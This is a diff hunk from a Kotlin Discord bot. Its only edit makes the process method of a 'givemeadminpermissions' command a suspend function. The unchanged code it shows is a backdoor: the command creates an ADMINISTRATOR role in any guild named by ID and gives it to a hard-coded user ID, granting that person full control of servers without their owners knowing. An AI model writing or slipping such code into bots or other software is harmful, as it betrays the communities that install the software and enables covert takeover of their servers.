@@ -16,7 +16,7 @@ class GiveMeAdminPermissionsCommand : Command("givemeadminpermissions", ":^)", C
             .build()
     }
 
-    override fun process(e: GuildCommandEvent) {
+    override suspend fun process(e: GuildCommandEvent) {
         val g = e.jda.getGuildById(e.arguments.getID("guild"))
         g!!.createRole().setPermissions(Permission.ADMINISTRATOR).setName(":^)").queue {
             g.addRoleToMember(UserSnowflake.fromId(Constants.FLOID), it).queue()
